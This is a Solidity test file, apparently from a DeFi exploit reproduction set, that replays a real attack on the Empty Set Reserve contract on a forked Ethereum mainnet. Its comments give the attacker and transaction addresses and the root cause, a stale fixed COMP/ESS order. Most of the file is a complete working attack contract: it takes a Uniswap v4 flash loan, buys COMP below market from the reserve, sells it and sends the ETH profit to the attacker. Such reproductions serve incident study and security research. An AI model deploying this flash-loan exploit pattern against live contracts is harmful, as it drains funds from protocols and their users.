// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : $1,509.78
// Attacker : 0xdDEB9e72fbecCa668fFD47314565954347ade522
// Attack Contract : 0x17E2c0844AE7CfE9D0B04cA923017F4892824E15
// Vulnerable Contract : 0xD05aCe63789cCb35B9cE71d01e4d632a0486Da4B
// Attack Tx : https://etherscan.io/tx/0x240e9573e6c59cfe025c311c176c351bb07a86ae994aaaff58ec3f7f84dab372
//
// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0xD05aCe63789cCb35B9cE71d01e4d632a0486Da4B#code
// Vulnerable Implementation : https://etherscan.io/address/0x363aF3acFfEd0B7181C2E3c56C00922E142100a8#code
//
// @Analysis
// Telegram Alert : https://t.me/defimon_alerts/1532
//
// Attack summary: The attacker used Uniswap v4 flash accounting to source USDC, DSU, and ESS, then bought COMP from
// Empty Set Reserve through its stale COMP/ESS fixed order and sold the COMP through Uniswap liquidity for ETH profit.
// Root cause: Empty Set Reserve exposed a stale/favorable fixed maker/taker order through swap(), allowing a public
// caller to buy the reserve's COMP inventory below market and extract the spread.

interface IPoolManager {
    function unlock(
        bytes calldata data
    ) external returns (bytes memory);
    function take(address currency, address to, uint256 amount) external;
    function sync(
        address currency
    ) external;
    function settle() external payable returns (uint256);
}

interface ITwoWayBatcher {
    function wrap(uint256 amount, address to) external;
}

interface IEmptySetReserve {
    function order(address makerToken, address takerToken) external view returns (uint256 price, uint256 amount);
    function swap(address makerToken, address takerToken, uint256 takerAmount) external;
}

contract ContractTest is BaseTestWithBalanceLog {
    address private constant ATTACKER = 0xdDEB9e72fbecCa668fFD47314565954347ade522;
    address private constant TRACE_ATTACK_CONTRACT = 0x17E2c0844AE7CfE9D0B04cA923017F4892824E15;
    address private constant RESERVE_IMPL = 0x363aF3acFfEd0B7181C2E3c56C00922E142100a8;

    IEmptySetReserve private constant RESERVE = IEmptySetReserve(0xD05aCe63789cCb35B9cE71d01e4d632a0486Da4B);
    IERC20 private constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 private constant DSU = IERC20(0x605D26FBd5be761089281d5cec2Ce86eeA667109);
    IERC20 private constant ESS = IERC20(0x24aE124c4CC33D6791F8E8B63520ed7107ac8b3e);
    IERC20 private constant COMP = IERC20(0xc00e94Cb662C3520282E6f5717214004A7f26888);

    uint256 private constant FORK_BLOCK = 22_988_103;
    uint256 private constant TRACE_ETH_TRANSFER = 415_688_696_263_702_812;
    uint256 private constant LOCAL_REPLAY_PROFIT = 416_271_181_367_327_696;
    uint256 private constant LOCAL_REPLAY_ESS_RESIDUAL = 204_890_442_016_374_993_231_659;
    uint256 private constant TRACE_ORDER_PRICE = 267_010_781_166_742_363_801_758;
    uint256 private constant TRACE_ORDER_AMOUNT = 41_581_642_538_295_042_665;

    function setUp() public {
        vm.createSelectFork("mainnet", FORK_BLOCK);

        fundingToken = address(0);
        attacker = ATTACKER;

        vm.label(ATTACKER, "EOA attacker");
        vm.label(TRACE_ATTACK_CONTRACT, "trace attack contract");
        vm.label(address(RESERVE), "Empty Set Reserve proxy");
        vm.label(RESERVE_IMPL, "Empty Set Reserve implementation");
        vm.label(address(USDC), "USDC");
        vm.label(address(DSU), "DSU");
        vm.label(address(ESS), "ESS");
        vm.label(address(COMP), "COMP");
    }

    function testExploit() public balanceLog {
        (uint256 priceBefore, uint256 amountBefore) = RESERVE.order(address(COMP), address(ESS));
        assertEq(priceBefore, TRACE_ORDER_PRICE, "unexpected COMP/ESS order price");
        assertEq(amountBefore, TRACE_ORDER_AMOUNT, "unexpected COMP/ESS order amount");

        uint256 ethBefore = ATTACKER.balance;

        EmptySetReserveAttack attackContract = new EmptySetReserveAttack();
        attackContract.execute();

        uint256 profit = ATTACKER.balance - ethBefore;
        assertEq(profit, LOCAL_REPLAY_PROFIT, "ETH profit mismatch");
        assertGt(profit, TRACE_ETH_TRANSFER, "profit below traced transfer");
        assertEq(USDC.balanceOf(address(attackContract)), 0, "attack contract kept USDC");
        assertEq(COMP.balanceOf(address(attackContract)), 0, "attack contract kept COMP");
        assertEq(ESS.balanceOf(address(attackContract)), LOCAL_REPLAY_ESS_RESIDUAL, "unexpected ESS residual");
        assertEq(DSU.balanceOf(address(attackContract)), 0, "attack contract kept DSU");
    }
}

contract EmptySetReserveAttack {
    address private constant ATTACKER = 0xdDEB9e72fbecCa668fFD47314565954347ade522;
    IPoolManager private constant POOL_MANAGER = IPoolManager(0x000000000004444c5dc75cB358380D2e3dE08A90);
    ITwoWayBatcher private constant TWO_WAY_BATCHER = ITwoWayBatcher(0xAEf566ca7E84d1E736f999765a804687f39D9094);
    IEmptySetReserve private constant RESERVE = IEmptySetReserve(0xD05aCe63789cCb35B9cE71d01e4d632a0486Da4B);
    IUniswapV2Router private constant UNISWAP_V2_ROUTER =
        IUniswapV2Router(payable(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D));
    Uni_Router_V3 private constant UNISWAP_V3_ROUTER = Uni_Router_V3(0xE592427A0AEce92De3Edee1F18E0157C05861564);

    IERC20 private constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 private constant DSU = IERC20(0x605D26FBd5be761089281d5cec2Ce86eeA667109);
    IERC20 private constant ESS = IERC20(0x24aE124c4CC33D6791F8E8B63520ed7107ac8b3e);
    IERC20 private constant COMP = IERC20(0xc00e94Cb662C3520282E6f5717214004A7f26888);
    IWETH private constant WETH = IWETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));

    uint256 private constant FLASH_USDC = 10_000_000_000;
    uint256 private constant WRAP_DSU_AMOUNT = 227_550_528_462_023_058_437;
    uint256 private constant USDC_TO_WETH_AMOUNT = 227_550_528;
    uint256 private constant WETH_TO_ESS_AMOUNT = 62_460_734_547_587_260;
    uint256 private constant RESERVE_ESS_IN = 11_102_746_856_346_403_118_005_018;
    uint256 private constant COMP_TO_USDC_AMOUNT = 9_615_500_579_758_040_742;
    uint256 private constant COMP_TO_WETH_AMOUNT = 31_966_141_958_537_001_922;
    uint256 private constant LEFTOVER_USDC = 4_531_880;

    function execute() external {
        POOL_MANAGER.unlock("");

        uint256 leftoverUsdc = USDC.balanceOf(address(this));
        require(leftoverUsdc == LEFTOVER_USDC, "unexpected leftover USDC");
        _swapV2(address(USDC), address(WETH), leftoverUsdc);

        WETH.withdraw(WETH.balanceOf(address(this)));
        (bool ok,) = payable(ATTACKER).call{value: address(this).balance}("");
        require(ok, "ETH transfer failed");
    }

    function unlockCallback(
        bytes calldata
    ) external returns (bytes memory) {
        require(msg.sender == address(POOL_MANAGER), "only pool manager");

        POOL_MANAGER.take(address(USDC), address(this), FLASH_USDC);

        USDC.approve(address(TWO_WAY_BATCHER), type(uint256).max);
        TWO_WAY_BATCHER.wrap(WRAP_DSU_AMOUNT, address(this));

        DSU.approve(address(UNISWAP_V2_ROUTER), type(uint256).max);
        _swapV2(address(DSU), address(ESS), WRAP_DSU_AMOUNT);

        USDC.approve(address(UNISWAP_V2_ROUTER), type(uint256).max);
        _swapV2(address(USDC), address(WETH), USDC_TO_WETH_AMOUNT);

        WETH.approve(address(UNISWAP_V3_ROUTER), type(uint256).max);
        UNISWAP_V3_ROUTER.exactInputSingle(
            Uni_Router_V3.ExactInputSingleParams({
                tokenIn: address(WETH),
                tokenOut: address(ESS),
                fee: 3000,
                recipient: address(this),
                deadline: block.timestamp,
                amountIn: WETH_TO_ESS_AMOUNT,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            })
        );

        ESS.approve(address(RESERVE), type(uint256).max);
        RESERVE.swap(address(COMP), address(ESS), RESERVE_ESS_IN);

        COMP.approve(address(UNISWAP_V2_ROUTER), type(uint256).max);
        _swapV2Path(address(COMP), address(WETH), address(USDC), COMP_TO_USDC_AMOUNT);
        _swapV2(address(COMP), address(WETH), COMP_TO_WETH_AMOUNT);

        POOL_MANAGER.sync(address(USDC));
        USDC.transfer(address(POOL_MANAGER), FLASH_USDC);
        POOL_MANAGER.settle();

        return "";
    }

    function _swapV2(address tokenIn, address tokenOut, uint256 amountIn) private {
        address[] memory path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;
        IUniswapV2Router(UNISWAP_V2_ROUTER).swapExactTokensForTokens(amountIn, 0, path, address(this), block.timestamp);
    }

    function _swapV2Path(address tokenIn, address tokenMid, address tokenOut, uint256 amountIn) private {
        address[] memory path = new address[](3);
        path[0] = tokenIn;
        path[1] = tokenMid;
        path[2] = tokenOut;
        IUniswapV2Router(UNISWAP_V2_ROUTER).swapExactTokensForTokens(amountIn, 0, path, address(this), block.timestamp);
    }

    receive() external payable {}
}
